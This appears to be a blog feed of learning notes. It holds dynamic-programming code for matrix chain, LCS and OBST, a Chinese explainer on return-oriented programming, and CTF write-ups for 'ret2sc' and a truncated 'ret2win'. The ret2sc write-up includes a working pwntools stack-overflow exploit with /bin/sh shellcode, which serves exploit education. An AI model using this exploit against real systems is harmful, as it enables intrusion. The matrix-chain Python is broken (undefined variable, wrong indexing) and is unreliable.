← i+l-1<br>m[i,j] = ∞<br>for k ← i to j-1 do<br>q ← m[i,k] + m[k+1,j] + p[i-1]*p[k]*p[j]<br></code></pre></td></tr></table></figure><p>in python</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py">INF = <span class="hljs-number">1000000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_chain</span>(<span class="hljs-params">p</span>):<br>n = <span class="hljs-built_in">len</span>(a)<br>m = [[<span class="hljs-literal">None</span>] * n <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n+<span class="hljs-number">1</span>)]<br>s = [[<span class="hljs-literal">None</span>] * n <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n+<span class="hljs-number">1</span>)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n+<span class="hljs-number">1</span>):<br>        m[i][i] = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,n+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n-l+<span class="hljs-number">2</span>):<br>            j = i+l-<span class="hljs-number">1</span><br>            m[i][j] = INF<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i,j):<br>                q = m[i][k] + m[k+<span class="hljs-number">1</span>][j] + p[i-<span class="hljs-number">1</span>]*p[k]*p[j]<br>                <span class="hljs-keyword">if</span> q &lt; m[i][j]:<br>                    m[i][j] = q<br>                    s[i][j] = k<br>                <span class="hljs-built_in">print</span>(m)<br>    <span class="hljs-keyword">return</span> m[n-<span class="hljs-number">1</span>][n-<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>a = [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(matrix_chain(a))<br></code></pre></td></tr></table></figure><h2 id="Recursive"><a href="#Recursive" class="headerlink" title="Recursive"></a>Recursive</h2><p>pseudocode</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">Recursive-matrix-chain(p,i,j)   //Top-down<br>if i = j then return 0<br>m[i,j] = ∞<br>for k ← i to j-1 do<br>q ← Recursive-matrix-chain(p,i,k) <br>+ Recursive-matrix-chain(p,k+1,j) <br>+ p[i-1]*p[k]*p[j]<br>if q &lt; m[i,j] then m[i,j] ← q<br>return m[i,j]<br></code></pre></td></tr></table></figure><p>python</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py">INF = <span class="hljs-number">1000000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_chain_recursive</span>(<span class="hljs-params">p,i,j</span>):<br>    n = <span class="hljs-built_in">len</span>(p)<br>    m = [[<span class="hljs-literal">None</span>] * n <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)]<br>    s = [[<span class="hljs-literal">None</span>] * n <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)]<br>    <span class="hljs-keyword">if</span> i == j:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    m[i][j] = INF<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i,j):<br>        q = matrix_chain_recursive(p,i,k) + matrix_chain_recursive(p,k+<span class="hljs-number">1</span>,j) \<br>            + p[i]*p[k+<span class="hljs-number">1</span>]*p[j+<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> q &lt; m[i][j]:<br>            m[i][j] = q<br>    <span class="hljs-keyword">return</span> m[i][j]<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>a = [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>    b = <span class="hljs-built_in">len</span>(a)<br>    <span class="hljs-built_in">print</span>(matrix_chain_recursive(a,<span class="hljs-number">0</span>,b-<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h2 id="Memoization"><a href="#Memoization" class="headerlink" title="Memoization"></a>Memoization</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">Memoized-matrix-chain(p)<br>for i ← 1 to n do<br>for j ← i to n do m[i,j] = ∞<br>return Look-up-chain(m,p,1,n)<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">Look-up-chain(m,p,i,j)<br>if m[i,j] &lt; ∞ then return m[i,j]<br>if i == j then m[i,j] ← 0<br>else<br>for k ← i to j-1 do<br>q ← Look-up-chain(m,p,i,k) <br>+ Look-up-chain(m,p,k+1,j)<br>+ p[i-1]*p[k]*p[j]<br>if q &lt; m[i,j] then m[i,j] ← q<br>return m[i,j]  <br></code></pre></td></tr></table></figure><h1 id="Longest-common-subsequence-LCS"><a href="#Longest-common-subsequence-LCS" class="headerlink" title="Longest common subsequence (LCS)"></a>Longest common subsequence (LCS)</h1><p>pseudocode</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">LCS(X,Y)<br>m = X.length<br>n = Y.length<br>Let s[0..m,0..n], r[0..m,0..n] be new arrays<br>for i ← 0 to n<br>s[0,i] = 0<br>for i ← 1 to m<br>s[i,0] = 0<br>for j ← 1 to n<br>if x[i] == y[j]<br>s[i,j] = s[i-1,j-1]+1<br>r[i,j] = &quot;↖&quot;<br>else if s[i-1,j] ≧ s[i,j-1]   //上面優先<br>s[i,j] = s[i-1,j]<br>r[i,j] = &quot;↑&quot;<br>else s[i,j] = s[i,j-1]<br>r[i,j] = &quot;←&quot;<br>return s, r<br></code></pre></td></tr></table></figure><p>python</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">LCS</span>(<span class="hljs-params">x,y</span>):<br>    m = <span class="hljs-built_in">len</span>(x)<br>    n = <span class="hljs-built_in">len</span>(y)<br>    s = [[<span class="hljs-literal">None</span>] * (n+<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m+<span class="hljs-number">1</span>)]<br>    r = [[<span class="hljs-literal">None</span>] * (n+<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m+<span class="hljs-number">1</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n+<span class="hljs-number">1</span>):<br>        s[<span class="hljs-number">0</span>][i] = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,m+<span class="hljs-number">1</span>):<br>        s[i][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> x[i-<span class="hljs-number">1</span>] == y[j-<span class="hljs-number">1</span>]:<br>                s[i][j] = s[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>] + <span class="hljs-number">1</span><br>                r[i][j] = <span class="hljs-string">&quot;↖&quot;</span><br>            <span class="hljs-keyword">elif</span> s[i-<span class="hljs-number">1</span>][j] &gt;= s[i][j-<span class="hljs-number">1</span>]: <span class="hljs-comment">#上面優先</span><br>                s[i][j] = s[i-<span class="hljs-number">1</span>][j]<br>                r[i][j] = <span class="hljs-string">&quot;↑&quot;</span><br>            <span class="hljs-keyword">else</span>: <br>                s[i][j] = s[i][j-<span class="hljs-number">1</span>]<br>                r[i][j] = <span class="hljs-string">&quot;←&quot;</span><br>    <span class="hljs-keyword">return</span> s, r<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    x = [<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span> ]<br>    y = [<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(LCS(x,y))<br></code></pre></td></tr></table></figure><h1 id="OBST"><a href="#OBST" class="headerlink" title="OBST"></a>OBST</h1><p>pseudocode</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">OBST(p,q,n)<br>let s[1..n+1,0..n], w[1..n+1,0..n], root[1..n,1..n]<br>for i ← 1 to n+1     //第一波斜線<br>s[i,i-1] = q[i-1]<br>w[i,i-1] = q[i-1]<br>for l ← 1 to n<br>for i ← 1 to n-l+1<br>j = i+l-1<br>s[i,j] = ∞<br>w[i,j] = w[i,j-1] + p[j] + q[j]<br>for r ← i to j<br>t = s[i,r-1] + s[r+1,j] + w[i,j]<br>if t &lt; s[i,j]<br>s[i,j] = t<br>root[i,j] = r<br>return s, root<br></code></pre></td></tr></table></figure><p>python</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py">INF = <span class="hljs-number">100000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">OBST</span>(<span class="hljs-params">p, q, n</span>):<br>    s = [[<span class="hljs-literal">None</span>] * (n+<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n+<span class="hljs-number">2</span>)]<br>    w = [[<span class="hljs-literal">None</span>] * (n+<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n+<span class="hljs-number">2</span>)]<br>    root = [[<span class="hljs-literal">None</span>] * (n+<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n+<span class="hljs-number">1</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">2</span>):<br>        s[i][i-<span class="hljs-number">1</span>] = q[i-<span class="hljs-number">1</span>]<br>        w[i][i-<span class="hljs-number">1</span>] = q[i-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n-l+<span class="hljs-number">2</span>):<br>            j = i+l-<span class="hljs-number">1</span><br>            s[i][j] = INF<br>            w[i][j] = w[i][j-<span class="hljs-number">1</span>] + p[j] + q[j]<br>            <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i,j+<span class="hljs-number">1</span>):<br>                t = s[i][r-<span class="hljs-number">1</span>] + s[r+<span class="hljs-number">1</span>][j] + w[i][j]<br>                <span class="hljs-keyword">if</span> t &lt; s[i][j]:<br>                    s[i][j] = t<br>                    root[i][j] = r<br>    <span class="hljs-keyword">return</span> s, root<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    p = [<span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>]<br>    q = [<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>    n = <span class="hljs-built_in">len</span>(p) - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(OBST(p, q, n))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Learning Note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Algorithm</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROP</title>
    <link href="/2021/11/03/ROP/"/>
    <url>/2021/11/03/ROP/</url>
    
    <content type="html"><![CDATA[<h1 id="返回導向程式設計-Return-Oriented-Programming"><a href="#返回導向程式設計-Return-Oriented-Programming" class="headerlink" title="返回導向程式設計(Return-Oriented Programming)"></a>返回導向程式設計(Return-Oriented Programming)</h1><p>是電腦安全中的一種<a href="https://zh.wikipedia.org/wiki/Exploit">漏洞利用</a>技術，該技術允許攻擊者在程式啟用了安全保護技術（如<a href="https://zh.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E5%9F%B7%E8%A1%8C%E9%98%B2%E6%AD%A2">堆疊不可執行</a>）的情況下控制程式執行流，執行惡意程式碼。</p><p>其核心思想是通過stack overflow等方式控制stack呼叫以劫持程式控制流並執行針對性的機器語言指令序列（稱為<strong>Gadgets</strong>）。</p><p><strong>Gadgets</strong> ：以 <code>ret</code> (machine code: <code>c3</code>)為結尾的指令序列，通過這些指令序列，我們可以修改某些位址的內容，方便控制程式的執行流程。</p><p><code>ret</code> 指令相當於 <code>pop eip</code>。即，首先將 <code>esp</code> 指向的 4 字節内容讀取並assign给 <code>eip</code>，然後 <code>esp</code> 加上 4 字節指向stack的下一个位置。如果當前執行的指令序列仍然以 <code>ret</code> 指令结束，則這個過程將重複， <code>esp</code> 再次增加並且執行下一个指令序列。</p><p>資料防止執行(Data Execution Prevention, <strong>DEP</strong>)</p><p>是一組在<a href="https://zh.wikipedia.org/wiki/%E9%9A%8F%E6%9C%BA%E5%AD%98%E5%8F%96%E5%AD%98%E5%82%A8%E5%99%A8">記憶體</a>上執行額外檢查的<a href="https://zh.wikipedia.org/wiki/%E7%A1%AC%E4%BB%B6">硬體</a>和<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6">軟體</a><a href="https://zh.wikipedia.org/wiki/%E6%8A%80%E6%9C%AF">技術</a>，有助於防止<a href="https://zh.wikipedia.org/wiki/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6">惡意程式</a>碼在<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">系統</a>上執行。</p><h2 id="尋找gadgets"><a href="#尋找gadgets" class="headerlink" title="尋找gadgets"></a>尋找gadgets</h2><ol><li>在program中尋找所有c3(ret)字節。</li><li>向前搜索，看前面的字節是否包含一個有效指令，這裡可以指定最大搜索字節數，以獲得不同長度的gadgets。</li><li>紀錄我們找到的所有有效指令序列。</li></ol><p>理論上我们是可以這樣尋找 gadgets 的，但實際上有很多工具可以完成這個工作，如 ROPgadget，Ropper 等。更完整的搜索可以使用 <a href="http://ropshell.com/">http://ropshell.com/</a>。</p><h2 id="常用的-gadgets"><a href="#常用的-gadgets" class="headerlink" title="常用的 gadgets"></a><strong>常用的 gadgets</strong></h2><ul><li>保存stack數據到register<ul><li>將stack頂的數據pop並保存到register中，然後跳轉到新的stack位址。所以當返回位址被一個gadgets的位址覆蓋，程序將在返回位址後執行該指令序列。</li><li>如：<code>pop eax; ret</code></li></ul></li><li>保存memory數據到register<ul><li>將memory地址處的數據load到memeory中。</li><li>如：<code>mov ecx,[eax]; ret</code></li></ul></li><li>保存register數據到memory<ul><li>將register的值保存到内存地址處。</li><li>如：<code>mov [eax],ecx; ret</code></li></ul></li><li>算數和邏輯運算<ul><li>add, sub, mul, xor 等。</li><li>如：<code>add eax,ebx; ret</code>, <code>xor edx,edx; ret</code></li></ul></li><li>系統調用<ul><li>執行kernel中斷</li><li>如：<code>int 0x80; ret</code>, <code>call gs:[0x10]; ret</code></li></ul></li><li>會影響stack frame的gadgets<ul><li>這些 gadgets 會改變 ebp 的值，從而影響stack frame，在一些操作如 stack pivot 時我們需要這樣的指令来轉移stack frame。</li><li>如：<code>leave; ret</code>, <code>pop ebp; ret</code></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Learning Note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CyberSecurity</tag>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup-ret2sc</title>
    <link href="/2021/11/01/Writeup-ret2sc/"/>
    <url>/2021/11/01/Writeup-ret2sc/</url>
    
    <content type="html"><![CDATA[<ol><li><p><code>file ret2sc</code> to take a look.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ file ret2sc<br>ret2sc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), <br>dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, <br>BuildID[sha1]=b83f13f0a84fdae7a5bc54d828d0e4ea15575d6d, not stripped<br></code></pre></td></tr></table></figure></li><li><p>gdb checksec to check the protection of this program.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb-peda ret2sc<br>Reading symbols from ret2sc...<br>(No debugging symbols found <span class="hljs-keyword">in</span> ret2sc)<br>gdb-peda$ checksec<br>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : disabled<br>PIE       : disabled<br>RELRO     : Partial<br>gdb-peda$<br></code></pre></td></tr></table></figure></li><li><p><code>r2 ret2sc</code>, there’s nothing special.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ r2 ret2sc<br>[0x00400540]&gt; aa<br>[x] Analyze all flags starting with sym. and entry0 (aa)<br>[0x00400540]&gt; afl<br>0x00400540    1 41           entry0<br>0x00400500    1 6            sym.imp.__libc_start_main<br>0x00400570    4 50   -&gt; 41   sym.deregister_tm_clones<br>0x004005b0    4 58   -&gt; 55   sym.register_tm_clones<br>0x004005f0    3 28           sym.__do_global_dtors_aux<br>0x00400610    4 38   -&gt; 35   entry.init0<br>0x00400720    1 2            sym.__libc_csu_fini<br>0x00400724    1 9            sym._fini<br>0x004006b0    4 101          sym.__libc_csu_init<br>0x00400636    1 114          main<br>0x00400520    1 6            sym.imp.setvbuf<br>0x004004e0    1 6            sym.imp.printf<br>0x004004f0    1 6            sym.imp.read<br>0x00400510    1 6            sym.imp.gets<br>0x004004b0    3 26           sym._init<br>0x00400530    1 6            sym..plt.got<br>[0x00400540]&gt;<br></code></pre></td></tr></table></figure></li><li><p><code>s main</code>, <code>VV</code>. We saw there are two input, one is “name”, another is “try your best:”. the first will be put at <strong>0x601080</strong>, second will be put at <strong>var_20h(rbp-0x20)</strong>.</p></li></ol><p><img src="https://i.imgur.com/kkBkEOG.png" alt="Image"></p><ol start="5"><li>by the result above, we need to find the place that we can inject our shellcode, use gdb-peda.<br><code>gde-peda ret2sc</code>, <code>b main</code>, <code>r</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb-peda ret2sc<br>Reading symbols from ret2sc...<br>(No debugging symbols found <span class="hljs-keyword">in</span> ret2sc)<br>gdb-peda$ b main<br>Breakpoint 1 at 0x40063a<br>gdb-peda$ r<br></code></pre></td></tr></table></figure><p>then <code>vmmap</code>, we found that address between 0x601000-0x602000 have permission of rwx, and our input “name” (0x601080) is in this range. so we can inject our shellcode here.</p><p><img src="https://i.imgur.com/WQSd5Zm.png" alt="Image"></p><ol start="6"><li>write the exploit script, shellcode can be found on the <a href="https://www.exploit-db.com/shellcodes">exploit-db</a> website.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>ip = <span class="hljs-string">&quot;120.114.62.211&quot;</span><br>port = <span class="hljs-number">2122</span><br><br><span class="hljs-comment"># r = remote(ip,port)</span><br>r = process(<span class="hljs-string">&quot;./ret2sc&quot;</span>)<br><br>shellcode =\<br><span class="hljs-string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><br>r.sendafter(<span class="hljs-string">&quot;:&quot;</span>, shellcode)<br><span class="hljs-comment"># r.recvuntil(&#x27;:&#x27;)</span><br><span class="hljs-comment"># r.sendline(shellcode)</span><br><br>shellcode_address = <span class="hljs-number">0x601080</span><br>r.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span> + p64(shellcode_address))<br><br>r.interactive()<br></code></pre></td></tr></table></figure><ol start="7"><li>run the code and then we can get the shell, find the flag and print it.</li></ol>]]></content>
    
    
    <categories>
      
      <category>Writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CyberSecurity</tag>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup-ret2win</title>
    <link href="/2021/11/01/Writeup-ret2win/"/>
    <url>/2021/11/01/Writeup-ret2win/</url>
    
    <content type="html"><![CDATA[<ol><li><code>file ret2win</code>, gdb-peda <code>checksec</code> take a look.</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ file ret2win<br>ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, <br>interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, <br>BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb-peda ret2win<br>Reading symbols from ret2win...<br>(No debugging symbols found <span class="hljs-keyword">in</span> ret2win)<br>gdb-peda$ checksec<br>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : ENABLED<br>PIE       : disabled<br>RELRO     : Partial<br>gdb-peda$<br></code></pre></td></tr></table></figure><ol start="2"><li><code>r2 ret2win</code>, <code>aa</code>, <code>afl</code>. There’re some special function, we’ll check them later.</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ r2 ret2win<br>[0x004005b0]&gt; aa<br>[x] Analyze all flags starting with sym. and entry0 (aa)<br>[0x004005b0]&gt; afl<br>0x004005b0    1 42           entry0<br>0x004005f0    4 42   -&gt; 37   sym.deregister_tm_clones<br>0x00400620    4 58   -&gt; 55   sym.register_tm_clones<br>0x00400660    3 34   -&gt; 29   sym.__do_global_dtors_aux<br>0x00400690    1 7            entry.init0<br>0x004006e8    1 110          sym.pwnme<br>0x00400580    1 6            sym.imp.memset<br>0x00400550    1 6            sym.imp.puts<br>0x00400570    1 6            sym.imp.printf<br>0x00400590    1 6            sym.imp.read<br>0x00400756    1 27           sym.ret2win<br>0x00400560    1 6            sym.imp.system<br>0x004007f0    1 2            sym.__libc_csu_fini<br>0x004007f4    1 9            sym._fini<br>0x00400780    4 101          sym.__libc_csu_init<br>0x004005e0    1 2            sym._dl_relocate_static_pie<br>0x00400697    1 81           